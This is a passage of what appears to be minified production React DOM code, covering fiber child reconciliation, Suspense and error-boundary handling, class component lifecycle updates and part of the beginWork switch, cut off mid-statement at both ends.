q===null||q.tag!==6?(q=ag(X,K.mode,oe),q.return=K,q):(q=m(q,X),q.return=K,q)}function U(K,q,X,oe){var Ee=X.type;return Ee===C?se(K,q,X.props.children,oe,X.key):q!==null&&(q.elementType===Ee||typeof Ee=="object"&&Ee!==null&&Ee.$$typeof===T&&$2(Ee)===q.type)?(q=m(q,X.props),bu(q,X),q.return=K,q):(q=Eh(X.type,X.key,X.props,null,K.mode,oe),bu(q,X),q.return=K,q)}function J(K,q,X,oe){return q===null||q.tag!==4||q.stateNode.containerInfo!==X.containerInfo||q.stateNode.implementation!==X.implementation?(q=og(X,K.mode,oe),q.return=K,q):(q=m(q,X.children||[]),q.return=K,q)}function se(K,q,X,oe,Ee){return q===null||q.tag!==7?(q=go(X,K.mode,oe,Ee),q.return=K,q):(q=m(q,X),q.return=K,q)}function ce(K,q,X){if(typeof q=="string"&&q!==""||typeof q=="number"||typeof q=="bigint")return q=ag(""+q,K.mode,X),q.return=K,q;if(typeof q=="object"&&q!==null){switch(q.$$typeof){case w:return X=Eh(q.type,q.key,q.props,null,K.mode,X),bu(X,q),X.return=K,X;case E:return q=og(q,K.mode,X),q.return=K,q;case T:var oe=q._init;return q=oe(q._payload),ce(K,q,X)}if(Me(q)||z(q))return q=go(q,K.mode,X,null),q.return=K,q;if(typeof q.then=="function")return ce(K,zh(q),X);if(q.$$typeof===D)return ce(K,Nh(K,q),X);Fh(K,q)}return null}function te(K,q,X,oe){var Ee=q!==null?q.key:null;if(typeof X=="string"&&X!==""||typeof X=="number"||typeof X=="bigint")return Ee!==null?null:S(K,q,""+X,oe);if(typeof X=="object"&&X!==null){switch(X.$$typeof){case w:return X.key===Ee?U(K,q,X,oe):null;case E:return X.key===Ee?J(K,q,X,oe):null;case T:return Ee=X._init,X=Ee(X._payload),te(K,q,X,oe)}if(Me(X)||z(X))return Ee!==null?null:se(K,q,X,oe,null);if(typeof X.then=="function")return te(K,q,zh(X),oe);if(X.$$typeof===D)return te(K,q,Nh(K,X),oe);Fh(K,X)}return null}function ne(K,q,X,oe,Ee){if(typeof oe=="string"&&oe!==""||typeof oe=="number"||typeof oe=="bigint")return K=K.get(X)||null,S(q,K,""+oe,Ee);if(typeof oe=="object"&&oe!==null){switch(oe.$$typeof){case w:return K=K.get(oe.key===null?X:oe.key)||null,U(q,K,oe,Ee);case E:return K=K.get(oe.key===null?X:oe.key)||null,J(q,K,oe,Ee);case T:var Je=oe._init;return oe=Je(oe._payload),ne(K,q,X,oe,Ee)}if(Me(oe)||z(oe))return K=K.get(X)||null,se(q,K,oe,Ee,null);if(typeof oe.then=="function")return ne(K,q,X,zh(oe),Ee);if(oe.$$typeof===D)return ne(K,q,X,Nh(q,oe),Ee);Fh(q,oe)}return null}function Fe(K,q,X,oe){for(var Ee=null,Je=null,Ie=q,Ue=q=0,An=null;Ie!==null&&Ue<X.length;Ue++){Ie.index>Ue?(An=Ie,Ie=null):An=Ie.sibling;var vt=te(K,Ie,X[Ue],oe);if(vt===null){Ie===null&&(Ie=An);break}r&&Ie&&vt.alternate===null&&a(K,Ie),q=y(vt,q,Ue),Je===null?Ee=vt:Je.sibling=vt,Je=vt,Ie=An}if(Ue===X.length)return l(K,Ie),xt&&vo(K,Ue),Ee;if(Ie===null){for(;Ue<X.length;Ue++)Ie=ce(K,X[Ue],oe),Ie!==null&&(q=y(Ie,q,Ue),Je===null?Ee=Ie:Je.sibling=Ie,Je=Ie);return xt&&vo(K,Ue),Ee}for(Ie=u(Ie);Ue<X.length;Ue++)An=ne(Ie,K,Ue,X[Ue],oe),An!==null&&(r&&An.alternate!==null&&Ie.delete(An.key===null?Ue:An.key),q=y(An,q,Ue),Je===null?Ee=An:Je.sibling=An,Je=An);return r&&Ie.forEach(function(xa){return a(K,xa)}),xt&&vo(K,Ue),Ee}function Le(K,q,X,oe){if(X==null)throw Error(i(151));for(var Ee=null,Je=null,Ie=q,Ue=q=0,An=null,vt=X.next();Ie!==null&&!vt.done;Ue++,vt=X.next()){Ie.index>Ue?(An=Ie,Ie=null):An=Ie.sibling;var xa=te(K,Ie,vt.value,oe);if(xa===null){Ie===null&&(Ie=An);break}r&&Ie&&xa.alternate===null&&a(K,Ie),q=y(xa,q,Ue),Je===null?Ee=xa:Je.sibling=xa,Je=xa,Ie=An}if(vt.done)return l(K,Ie),xt&&vo(K,Ue),Ee;if(Ie===null){for(;!vt.done;Ue++,vt=X.next())vt=ce(K,vt.value,oe),vt!==null&&(q=y(vt,q,Ue),Je===null?Ee=vt:Je.sibling=vt,Je=vt);return xt&&vo(K,Ue),Ee}for(Ie=u(Ie);!vt.done;Ue++,vt=X.next())vt=ne(Ie,K,Ue,vt.value,oe),vt!==null&&(r&&vt.alternate!==null&&Ie.delete(vt.key===null?Ue:vt.key),q=y(vt,q,Ue),Je===null?Ee=vt:Je.sibling=vt,Je=vt);return r&&Ie.forEach(function(H3){return a(K,H3)}),xt&&vo(K,Ue),Ee}function Mt(K,q,X,oe){if(typeof X=="object"&&X!==null&&X.type===C&&X.key===null&&(X=X.props.children),typeof X=="object"&&X!==null){switch(X.$$typeof){case w:e:{for(var Ee=X.key;q!==null;){if(q.key===Ee){if(Ee=X.type,Ee===C){if(q.tag===7){l(K,q.sibling),oe=m(q,X.props.children),oe.return=K,K=oe;break e}}else if(q.elementType===Ee||typeof Ee=="object"&&Ee!==null&&Ee.$$typeof===T&&$2(Ee)===q.type){l(K,q.sibling),oe=m(q,X.props),bu(oe,X),oe.return=K,K=oe;break e}l(K,q);break}else a(K,q);q=q.sibling}X.type===C?(oe=go(X.props.children,K.mode,oe,X.key),oe.return=K,K=oe):(oe=Eh(X.type,X.key,X.props,null,K.mode,oe),bu(oe,X),oe.return=K,K=oe)}return A(K);case E:e:{for(Ee=X.key;q!==null;){if(q.key===Ee)if(q.tag===4&&q.stateNode.containerInfo===X.containerInfo&&q.stateNode.implementation===X.implementation){l(K,q.sibling),oe=m(q,X.children||[]),oe.return=K,K=oe;break e}else{l(K,q);break}else a(K,q);q=q.sibling}oe=og(X,K.mode,oe),oe.return=K,K=oe}return A(K);case T:return Ee=X._init,X=Ee(X._payload),Mt(K,q,X,oe)}if(Me(X))return Fe(K,q,X,oe);if(z(X)){if(Ee=z(X),typeof Ee!="function")throw Error(i(150));return X=Ee.call(X),Le(K,q,X,oe)}if(typeof X.then=="function")return Mt(K,q,zh(X),oe);if(X.$$typeof===D)return Mt(K,q,Nh(K,X),oe);Fh(K,X)}return typeof X=="string"&&X!==""||typeof X=="number"||typeof X=="bigint"?(X=""+X,q!==null&&q.tag===6?(l(K,q.sibling),oe=m(q,X),oe.return=K,K=oe):(l(K,q),oe=ag(X,K.mode,oe),oe.return=K,K=oe),A(K)):l(K,q)}return function(K,q,X,oe){try{wu=0;var Ee=Mt(K,q,X,oe);return kl=null,Ee}catch(Ie){if(Ie===du||Ie===Ih)throw Ie;var Je=Ni(29,Ie,null,K.mode);return Je.lanes=oe,Je.return=K,Je}finally{}}}var Dl=X2(!0),Z2=X2(!1),er=ae(null),Br=null;function oa(r){var a=r.alternate;ue(pn,pn.current&1),ue(er,r),Br===null&&(a===null||Sl.current!==null||a.memoizedState!==null)&&(Br=r)}function J2(r){if(r.tag===22){if(ue(pn,pn.current),ue(er,r),Br===null){var a=r.alternate;a!==null&&a.memoizedState!==null&&(Br=r)}}else la()}function la(){ue(pn,pn.current),ue(er,er.current)}function bs(r){ge(er),Br===r&&(Br=null),ge(pn)}var pn=ae(0);function Hh(r){for(var a=r;a!==null;){if(a.tag===13){var l=a.memoizedState;if(l!==null&&(l=l.dehydrated,l===null||l.data==="$?"||Ry(l)))return a}else if(a.tag===19&&a.memoizedProps.revealOrder!==void 0){if((a.flags&128)!==0)return a}else if(a.child!==null){a.child.return=a,a=a.child;continue}if(a===r)break;for(;a.sibling===null;){if(a.return===null||a.return===r)return null;a=a.return}a.sibling.return=a.return,a=a.sibling}return null}function Bg(r,a,l,u){a=r.memoizedState,l=l(u,a),l=l==null?a:v({},a,l),r.memoizedState=l,r.lanes===0&&(r.updateQueue.baseState=l)}var zg={enqueueSetState:function(r,a,l){r=r._reactInternals;var u=Di(),m=ra(u);m.payload=a,l!=null&&(m.callback=l),a=sa(r,m,u),a!==null&&(Mi(a,r,u),fu(a,r,u))},enqueueReplaceState:function(r,a,l){r=r._reactInternals;var u=Di(),m=ra(u);m.tag=1,m.payload=a,l!=null&&(m.callback=l),a=sa(r,m,u),a!==null&&(Mi(a,r,u),fu(a,r,u))},enqueueForceUpdate:function(r,a){r=r._reactInternals;var l=Di(),u=ra(l);u.tag=2,a!=null&&(u.callback=a),a=sa(r,u,l),a!==null&&(Mi(a,r,l),fu(a,r,l))}};function eb(r,a,l,u,m,y,A){return r=r.stateNode,typeof r.shouldComponentUpdate=="function"?r.shouldComponentUpdate(u,y,A):a.prototype&&a.prototype.isPureReactComponent?!iu(l,u)||!iu(m,y):!0}function tb(r,a,l,u){r=a.state,typeof a.componentWillReceiveProps=="function"&&a.componentWillReceiveProps(l,u),typeof a.UNSAFE_componentWillReceiveProps=="function"&&a.UNSAFE_componentWillReceiveProps(l,u),a.state!==r&&zg.enqueueReplaceState(a,a.state,null)}function To(r,a){var l=a;if("ref"in a){l={};for(var u in a)u!=="ref"&&(l[u]=a[u])}if(r=r.defaultProps){l===a&&(l=v({},l));for(var m in r)l[m]===void 0&&(l[m]=r[m])}return l}var qh=typeof reportError=="function"?reportError:function(r){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var a=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof r=="object"&&r!==null&&typeof r.message=="string"?String(r.message):String(r),error:r});if(!window.dispatchEvent(a))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",r);return}console.error(r)};function nb(r){qh(r)}function ib(r){console.error(r)}function rb(r){qh(r)}function Gh(r,a){try{var l=r.onUncaughtError;l(a.value,{componentStack:a.stack})}catch(u){setTimeout(function(){throw u})}}function sb(r,a,l){try{var u=r.onCaughtError;u(l.value,{componentStack:l.stack,errorBoundary:a.tag===1?a.stateNode:null})}catch(m){setTimeout(function(){throw m})}}function Fg(r,a,l){return l=ra(l),l.tag=3,l.payload={element:null},l.callback=function(){Gh(r,a)},l}function ab(r){return r=ra(r),r.tag=3,r}function ob(r,a,l,u){var m=l.type.getDerivedStateFromError;if(typeof m=="function"){var y=u.value;r.payload=function(){return m(y)},r.callback=function(){sb(a,l,u)}}var A=l.stateNode;A!==null&&typeof A.componentDidCatch=="function"&&(r.callback=function(){sb(a,l,u),typeof m!="function"&&(ma===null?ma=new Set([this]):ma.add(this));var S=u.stack;this.componentDidCatch(u.value,{componentStack:S!==null?S:""})})}function HR(r,a,l,u,m){if(l.flags|=32768,u!==null&&typeof u=="object"&&typeof u.then=="function"){if(a=l.alternate,a!==null&&lu(a,l,m,!0),l=er.current,l!==null){switch(l.tag){case 13:return Br===null?hy():l.alternate===null&&Qt===0&&(Qt=3),l.flags&=-257,l.flags|=65536,l.lanes=m,u===yg?l.flags|=16384:(a=l.updateQueue,a===null?l.updateQueue=new Set([u]):a.add(u),my(r,u,m)),!1;case 22:return l.flags|=65536,u===yg?l.flags|=16384:(a=l.updateQueue,a===null?(a={transitions:null,markerInstances:null,retryQueue:new Set([u])},l.updateQueue=a):(l=a.retryQueue,l===null?a.retryQueue=new Set([u]):l.add(u)),my(r,u,m)),!1}throw Error(i(435,l.tag))}return my(r,u,m),hy(),!1}if(xt)return a=er.current,a!==null?((a.flags&65536)===0&&(a.flags|=256),a.flags|=65536,a.lanes=m,u!==ug&&(r=Error(i(422),{cause:u}),ou($i(r,l)))):(u!==ug&&(a=Error(i(423),{cause:u}),ou($i(a,l))),r=r.current.alternate,r.flags|=65536,m&=-m,r.lanes|=m,u=$i(u,l),m=Fg(r.stateNode,u,m),wg(r,m),Qt!==4&&(Qt=2)),!1;var y=Error(i(520),{cause:u});if(y=$i(y,l),Nu===null?Nu=[y]:Nu.push(y),Qt!==4&&(Qt=2),a===null)return!0;u=$i(u,l),l=a;do{switch(l.tag){case 3:return l.flags|=65536,r=m&-m,l.lanes|=r,r=Fg(l.stateNode,u,r),wg(l,r),!1;case 1:if(a=l.type,y=l.stateNode,(l.flags&128)===0&&(typeof a.getDerivedStateFromError=="function"||y!==null&&typeof y.componentDidCatch=="function"&&(ma===null||!ma.has(y))))return l.flags|=65536,m&=-m,l.lanes|=m,m=ab(m),ob(m,r,l,u),wg(l,m),!1}l=l.return}while(l!==null);return!1}var lb=Error(i(461)),bn=!1;function On(r,a,l,u){a.child=r===null?Z2(a,null,l,u):Dl(a,r.child,l,u)}function cb(r,a,l,u,m){l=l.render;var y=a.ref;if("ref"in u){var A={};for(var S in u)S!=="ref"&&(A[S]=u[S])}else A=u;return xo(a),u=Tg(r,a,l,A,y,m),S=Cg(),r!==null&&!bn?(Sg(r,a,m),xs(r,a,m)):(xt&&S&&lg(a),a.flags|=1,On(r,a,u,m),a.child)}function ub(r,a,l,u,m){if(r===null){var y=l.type;return typeof y=="function"&&!sg(y)&&y.defaultProps===void 0&&l.compare===null?(a.tag=15,a.type=y,db(r,a,y,u,m)):(r=Eh(l.type,null,u,a,a.mode,m),r.ref=a.ref,r.return=a,a.child=r)}if(y=r.child,!$g(r,m)){var A=y.memoizedProps;if(l=l.compare,l=l!==null?l:iu,l(A,u)&&r.ref===a.ref)return xs(r,a,m)}return a.flags|=1,r=ps(y,u),r.ref=a.ref,r.return=a,a.child=r}function db(r,a,l,u,m){if(r!==null){var y=r.memoizedProps;if(iu(y,u)&&r.ref===a.ref)if(bn=!1,a.pendingProps=u=y,$g(r,m))(r.flags&131072)!==0&&(bn=!0);else return a.lanes=r.lanes,xs(r,a,m)}return Hg(r,a,l,u,m)}function hb(r,a,l){var u=a.pendingProps,m=u.children,y=r!==null?r.memoizedState:null;if(u.mode==="hidden"){if((a.flags&128)!==0){if(u=y!==null?y.baseLanes|l:l,r!==null){for(m=a.child=r.child,y=0;m!==null;)y=y|m.lanes|m.childLanes,m=m.sibling;a.childLanes=y&~u}else a.childLanes=0,a.child=null;return fb(r,a,u,l)}if((l&536870912)!==0)a.memoizedState={baseLanes:0,cachePool:null},r!==null&&Rh(a,y!==null?y.cachePool:null),y!==null?d2(a,y):xg(),J2(a);else return a.lanes=a.childLanes=536870912,fb(r,a,y!==null?y.baseLanes|l:l,l)}else y!==null?(Rh(a,y.cachePool),d2(a,y),la(),a.memoizedState=null):(r!==null&&Rh(a,null),xg(),la());return On(r,a,m,l),a.child}function fb(r,a,l,u){var m=gg();return m=m===null?null:{parent:mn._currentValue,pool:m},a.memoizedState={baseLanes:l,cachePool:m},r!==null&&Rh(a,null),xg(),J2(a),r!==null&&lu(r,a,u,!0),null}function Yh(r,a){var l=a.ref;if(l===null)r!==null&&r.ref!==null&&(a.flags|=4194816);else{if(typeof l!="function"&&typeof l!="object")throw Error(i(284));(r===null||r.ref!==l)&&(a.flags|=4194816)}}function Hg(r,a,l,u,m){return xo(a),l=Tg(r,a,l,u,void 0,m),u=Cg(),r!==null&&!bn?(Sg(r,a,m),xs(r,a,m)):(xt&&u&&lg(a),a.flags|=1,On(r,a,l,m),a.child)}function mb(r,a,l,u,m,y){return xo(a),a.updateQueue=null,l=f2(a,u,l,m),h2(r),u=Cg(),r!==null&&!bn?(Sg(r,a,y),xs(r,a,y)):(xt&&u&&lg(a),a.flags|=1,On(r,a,l,y),a.child)}function pb(r,a,l,u,m){if(xo(a),a.stateNode===null){var y=xl,A=l.contextType;typeof A=="object"&&A!==null&&(y=Gn(A)),y=new l(u,y),a.memoizedState=y.state!==null&&y.state!==void 0?y.state:null,y.updater=zg,a.stateNode=y,y._reactInternals=a,y=a.stateNode,y.props=u,y.state=a.memoizedState,y.refs={},vg(a),A=l.contextType,y.context=typeof A=="object"&&A!==null?Gn(A):xl,y.state=a.memoizedState,A=l.getDerivedStateFromProps,typeof A=="function"&&(Bg(a,l,A,u),y.state=a.memoizedState),typeof l.getDerivedStateFromProps=="function"||typeof y.getSnapshotBeforeUpdate=="function"||typeof y.UNSAFE_componentWillMount!="function"&&typeof y.componentWillMount!="function"||(A=y.state,typeof y.componentWillMount=="function"&&y.componentWillMount(),typeof y.UNSAFE_componentWillMount=="function"&&y.UNSAFE_componentWillMount(),A!==y.state&&zg.enqueueReplaceState(y,y.state,null),pu(a,u,y,m),mu(),y.state=a.memoizedState),typeof y.componentDidMount=="function"&&(a.flags|=4194308),u=!0}else if(r===null){y=a.stateNode;var S=a.memoizedProps,U=To(l,S);y.props=U;var J=y.context,se=l.contextType;A=xl,typeof se=="object"&&se!==null&&(A=Gn(se));var ce=l.getDerivedStateFromProps;se=typeof ce=="function"||typeof y.getSnapshotBeforeUpdate=="function",S=a.pendingProps!==S,se||typeof y.UNSAFE_componentWillReceiveProps!="function"&&typeof y.componentWillReceiveProps!="function"||(S||J!==A)&&tb(a,y,u,A),ia=!1;var te=a.memoizedState;y.state=te,pu(a,u,y,m),mu(),J=a.memoizedState,S||te!==J||ia?(typeof ce=="function"&&(Bg(a,l,ce,u),J=a.memoizedState),(U=ia||eb(a,l,U,u,te,J,A))?(se||typeof y.UNSAFE_componentWillMount!="function"&&typeof y.componentWillMount!="function"||(typeof y.componentWillMount=="function"&&y.componentWillMount(),typeof y.UNSAFE_componentWillMount=="function"&&y.UNSAFE_componentWillMount()),typeof y.componentDidMount=="function"&&(a.flags|=4194308)):(typeof y.componentDidMount=="function"&&(a.flags|=4194308),a.memoizedProps=u,a.memoizedState=J),y.props=u,y.state=J,y.context=A,u=U):(typeof y.componentDidMount=="function"&&(a.flags|=4194308),u=!1)}else{y=a.stateNode,_g(r,a),A=a.memoizedProps,se=To(l,A),y.props=se,ce=a.pendingProps,te=y.context,J=l.contextType,U=xl,typeof J=="object"&&J!==null&&(U=Gn(J)),S=l.getDerivedStateFromProps,(J=typeof S=="function"||typeof y.getSnapshotBeforeUpdate=="function")||typeof y.UNSAFE_componentWillReceiveProps!="function"&&typeof y.componentWillReceiveProps!="function"||(A!==ce||te!==U)&&tb(a,y,u,U),ia=!1,te=a.memoizedState,y.state=te,pu(a,u,y,m),mu();var ne=a.memoizedState;A!==ce||te!==ne||ia||r!==null&&r.dependencies!==null&&Sh(r.dependencies)?(typeof S=="function"&&(Bg(a,l,S,u),ne=a.memoizedState),(se=ia||eb(a,l,se,u,te,ne,U)||r!==null&&r.dependencies!==null&&Sh(r.dependencies))?(J||typeof y.UNSAFE_componentWillUpdate!="function"&&typeof y.componentWillUpdate!="function"||(typeof y.componentWillUpdate=="function"&&y.componentWillUpdate(u,ne,U),typeof y.UNSAFE_componentWillUpdate=="function"&&y.UNSAFE_componentWillUpdate(u,ne,U)),typeof y.componentDidUpdate=="function"&&(a.flags|=4),typeof y.getSnapshotBeforeUpdate=="function"&&(a.flags|=1024)):(typeof y.componentDidUpdate!="function"||A===r.memoizedProps&&te===r.memoizedState||(a.flags|=4),typeof y.getSnapshotBeforeUpdate!="function"||A===r.memoizedProps&&te===r.memoizedState||(a.flags|=1024),a.memoizedProps=u,a.memoizedState=ne),y.props=u,y.state=ne,y.context=U,u=se):(typeof y.componentDidUpdate!="function"||A===r.memoizedProps&&te===r.memoizedState||(a.flags|=4),typeof y.getSnapshotBeforeUpdate!="function"||A===r.memoizedProps&&te===r.memoizedState||(a.flags|=1024),u=!1)}return y=u,Yh(r,a),u=(a.flags&128)!==0,y||u?(y=a.stateNode,l=u&&typeof l.getDerivedStateFromError!="function"?null:y.render(),a.flags|=1,r!==null&&u?(a.child=Dl(a,r.child,null,m),a.child=Dl(a,null,l,m)):On(r,a,l,m),a.memoizedState=y.state,r=a.child):r=xs(r,a,m),r}function gb(r,a,l,u){return au(),a.flags|=256,On(r,a,l,u),a.child}var qg={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function Gg(r){return{baseLanes:r,cachePool:i2()}}function Yg(r,a,l){return r=r!==null?r.childLanes&~l:0,a&&(r|=tr),r}function yb(r,a,l){var u=a.pendingProps,m=!1,y=(a.flags&128)!==0,A;if((A=y)||(A=r!==null&&r.memoizedState===null?!1:(pn.current&2)!==0),A&&(m=!0,a.flags&=-129),A=(a.flags&32)!==0,a.flags&=-33,r===null){if(xt){if(m?oa(a):la(),xt){var S=Yt,U;if(U=S){e:{for(U=S,S=Ur;U.nodeType!==8;){if(!S){S=null;break e}if(U=pr(U.nextSibling),U===null){S=null;break e}}S=U}S!==null?(a.memoizedState={dehydrated:S,treeContext:yo!==null?{id:gs,overflow:ys}:null,retryLane:536870912,hydrationErrors:null},U=Ni(18,null,null,0),U.stateNode=S,U.return=a,a.child=U,ri=a,Yt=null,U=!0):U=!1}U||wo(a)}if(S=a.memoizedState,S!==null&&(S=S.dehydrated,S!==null))return Ry(S)?a.lanes=32:a.lanes=536870912,null;bs(a)}return S=u.children,u=u.fallback,m?(la(),m=a.mode,S=Qh({mode:"hidden",children:S},m),u=go(u,m,l,null),S.return=a,u.return=a,S.sibling=u,a.child=S,m=a.child,m.memoizedState=Gg(l),m.childLanes=Yg(r,A,l),a.memoizedState=qg,u):(oa(a),Qg(a,S))}if(U=r.memoizedState,U!==null&&(S=U.dehydrated,S!==null)){if(y)a.flags&256?(oa(a),a.flags&=-257,a=Kg(r,a,l)):a.memoizedState!==null?(la(),a.child=r.child,a.flags|=128,a=null):(la(),m=u.fallback,S=a.mode,u=Qh({mode:"visible",children:u.children},S),m=go(m,S,l,null),m.flags|=2,u.return=a,m.return=a,u.sibling=m,a.child=u,Dl(a,r.child,null,l),u=a.child,u.memoizedState=Gg(l),u.childLanes=Yg(r,A,l),a.memoizedState=qg,a=m);else if(oa(a),Ry(S)){if(A=S.nextSibling&&S.nextSibling.dataset,A)var J=A.dgst;A=J,u=Error(i(419)),u.stack="",u.digest=A,ou({value:u,source:null,stack:null}),a=Kg(r,a,l)}else if(bn||lu(r,a,l,!1),A=(l&r.childLanes)!==0,bn||A){if(A=Vt,A!==null&&(u=l&-l,u=(u&42)!==0?1:Rr(u),u=(u&(A.suspendedLanes|l))!==0?0:u,u!==0&&u!==U.retryLane))throw U.retryLane=u,bl(r,u),Mi(A,r,u),lb;S.data==="$?"||hy(),a=Kg(r,a,l)}else S.data==="$?"?(a.flags|=192,a.child=r.child,a=null):(r=U.treeContext,Yt=pr(S.nextSibling),ri=a,xt=!0,_o=null,Ur=!1,r!==null&&(Zi[Ji++]=gs,Zi[Ji++]=ys,Zi[Ji++]=yo,gs=r.id,ys=r.overflow,yo=a),a=Qg(a,u.children),a.flags|=4096);return a}return m?(la(),m=u.fallback,S=a.mode,U=r.child,J=U.sibling,u=ps(U,{mode:"hidden",children:u.children}),u.subtreeFlags=U.subtreeFlags&65011712,J!==null?m=ps(J,m):(m=go(m,S,l,null),m.flags|=2),m.return=a,u.return=a,u.sibling=m,a.child=u,u=m,m=a.child,S=r.child.memoizedState,S===null?S=Gg(l):(U=S.cachePool,U!==null?(J=mn._currentValue,U=U.parent!==J?{parent:J,pool:J}:U):U=i2(),S={baseLanes:S.baseLanes|l,cachePool:U}),m.memoizedState=S,m.childLanes=Yg(r,A,l),a.memoizedState=qg,u):(oa(a),l=r.child,r=l.sibling,l=ps(l,{mode:"visible",children:u.children}),l.return=a,l.sibling=null,r!==null&&(A=a.deletions,A===null?(a.deletions=[r],a.flags|=16):A.push(r)),a.child=l,a.memoizedState=null,l)}function Qg(r,a){return a=Qh({mode:"visible",children:a},r.mode),a.return=r,r.child=a}function Qh(r,a){return r=Ni(22,r,null,a),r.lanes=0,r.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null},r}function Kg(r,a,l){return Dl(a,r.child,null,l),r=Qg(a,a.pendingProps.children),r.flags|=2,a.memoizedState=null,r}function vb(r,a,l){r.lanes|=a;var u=r.alternate;u!==null&&(u.lanes|=a),hg(r.return,a,l)}function Wg(r,a,l,u,m){var y=r.memoizedState;y===null?r.memoizedState={isBackwards:a,rendering:null,renderingStartTime:0,last:u,tail:l,tailMode:m}:(y.isBackwards=a,y.rendering=null,y.renderingStartTime=0,y.last=u,y.tail=l,y.tailMode=m)}function _b(r,a,l){var u=a.pendingProps,m=u.revealOrder,y=u.tail;if(On(r,a,u.children,l),u=pn.current,(u&2)!==0)u=u&1|2,a.flags|=128;else{if(r!==null&&(r.flags&128)!==0)e:for(r=a.child;r!==null;){if(r.tag===13)r.memoizedState!==null&&vb(r,l,a);else if(r.tag===19)vb(r,l,a);else if(r.child!==null){r.child.return=r,r=r.child;continue}if(r===a)break e;for(;r.sibling===null;){if(r.return===null||r.return===a)break e;r=r.return}r.sibling.return=r.return,r=r.sibling}u&=1}switch(ue(pn,u),m){case"forwards":for(l=a.child,m=null;l!==null;)r=l.alternate,r!==null&&Hh(r)===null&&(m=l),l=l.sibling;l=m,l===null?(m=a.child,a.child=null):(m=l.sibling,l.sibling=null),Wg(a,!1,m,l,y);break;case"backwards":for(l=null,m=a.child,a.child=null;m!==null;){if(r=m.alternate,r!==null&&Hh(r)===null){a.child=m;break}r=m.sibling,m.sibling=l,l=m,m=r}Wg(a,!0,l,null,y);break;case"together":Wg(a,!1,null,null,void 0);break;default:a.memoizedState=null}return a.child}function xs(r,a,l){if(r!==null&&(a.dependencies=r.dependencies),fa|=a.lanes,(l&a.childLanes)===0)if(r!==null){if(lu(r,a,l,!1),(l&a.childLanes)===0)return null}else return null;if(r!==null&&a.child!==r.child)throw Error(i(153));if(a.child!==null){for(r=a.child,l=ps(r,r.pendingProps),a.child=l,l.return=a;r.sibling!==null;)r=r.sibling,l=l.sibling=ps(r,r.pendingProps),l.return=a;l.sibling=null}return a.child}function $g(r,a){return(r.lanes&a)!==0?!0:(r=r.dependencies,!!(r!==null&&Sh(r)))}function qR(r,a,l){switch(a.tag){case 3:gt(a,a.stateNode.containerInfo),na(a,mn,r.memoizedState.cache),au();break;case 27:case 5:Ft(a);break;case 4:gt(a,a.stateNode.containerInfo);break;case 10:na(a,a.type,a.memoizedProps.value);break;case 13:var u=a.memoizedState;if(u!==null)return u.dehydrated!==null?(oa(a),a.flags|=128,null):(l&a.child.childLanes)!==0?yb(r,a,l):(oa(a),r=xs(r,a,l),r!==null?r.sibling:null);oa(a);break;case 19:var m=(r.flags&128)!==0;if(u=(l&a.childLanes)!==0,u||(lu(r,a,l,!1),u=(l&a.childLanes)!==0),m){if(u)return _b(r,a,l);a.flags|=128}if(m=a.memoizedState,m!==null&&(m.rendering=null,m.tail=null,m.lastEffect=null),ue(pn,pn.current),u)break;return null;case 22:case 23:return a.lanes=0,hb(r,a,l);case 24:na(a,mn,r.memoizedState.cache)}return xs(r,a,l)}function wb(r,a,l){if(r!==null)if(r.memoizedProps!==a.pendingProps)bn=!0;else{if(!$g(r,l)&&(a.flags&128)===0)return bn=!1,qR(r,a,l);bn=(r.flags&131072)!==0}else bn=!1,xt&&(a.flags&1048576)!==0&&$w(a,Ch,a.index);switch(a.lanes=0,a.tag){case 16:e:{r=a.pendingProps;var u=a.elementType,m=u._init;if(u=m(u._payload),a.type=u,typeof u=="function")sg(u)?(r=To(u,r),a.tag=1,a=pb(null,a,u,r,l)):(a.tag=0,a=Hg(null,a,u,r,l));else{if(u!=null){if(m=u.$$typeof,m===Q){a.tag=11,a=cb(null,a,u,r,l);break e}else if(m===N){a.tag=14,a=ub(null,a,u,r,l);break e}}throw a=Ne(u)||u,Error(i(306,a,""))}}return a;case 0:return Hg(r,a,a.type,a.pendingProps,l);case 1:return u=a.type,m=To(u,a.pendingProps),pb(r,a,u,m,l);case 3:e:{if(gt(a,a.stateNode.containerInfo),r===null)throw Error(i(387));u=a.pendingProps;var y=a.memoizedState;m=y.element,_g(r,a),pu(a,u,null,l);var A=a.memoizedState;if(u=A.cache,na(a,mn,u),u!==y.cache&&fg(a,[mn],l,!0),mu(),u=A.element,y.isDehydrated)if(y={element:u,isDehydrated:!1,cache:A.cache},a.updateQueue.baseState=y,a.memoizedState=y,a.flags&256){a=gb(r,a,u,l);break e}else if(u!==m){m=$i(Error(i(424)),a),ou(m),a=gb(r,a,u,l);break e}else{switch(r=a.stateNode.containerInfo,r.nodeType){case 9:r=r.body;break;default:r=r.nodeName==="HTML"?r.ownerDocument.body:r}for(Yt=pr(r.firstChild),ri=a,xt=!0,_o=null,Ur=!0,l=Z2(a,null,u,l),a.child=l;l;)l.flags=l.flags&-3|4096,l=l.sibling}else{if(au(),u===m){a=xs(r,a,l);break e}On(r,a,u,l)}a=a.child}return a;case 26:return Yh(r,a),r===null?(l=E1(a.type,null,a.pendingProps,null))?a.memoizedState=l:xt||(l=a.type,r=a.pendingProps,u=lf(he.current).createElement(l),u[le]=a,u[pe]=r,jn(u,l,r),ut(u),a.stateNode=u):a.memoizedState=E1(a.type,r.memoizedProps,a.pendingProps,r.memoizedState),null;case 27:return Ft(a),r===null&&xt&&(u=a.stateNode=b1(a.type,a.pendingProps,he.current),ri=a,Ur=!0,m=Yt,ya(a.type)?(Iy=m,Yt=pr(u.firstChild)):Yt=m),On(r,a,a.pendingProps.children,l),Yh(r,a),r===null&&(a.flags|=4194304),a.child;case 5:return r===null&&xt&&((m=u=Yt)&&(u=v3(u,a.type,a.pendingProps,Ur),u!==null?(a.stateNode=u,ri=a,Yt=pr(u.firstChild),Ur=!1,m=!0):m=!1),m||wo(a)),Ft(a),m=a.type,y=a.pendingProps,A=r!==null?r.memoizedProps:null,u=y.children,Cy(m,y)?u=null:A!==null&&Cy(m,A)&&(a.flags|=32),a.memoizedState!==null&&(m=Tg(r,a,jR,null,null,l),Lu._currentValue=m),Yh(r,a),On(r,a,u,l),a.child;case 6:return 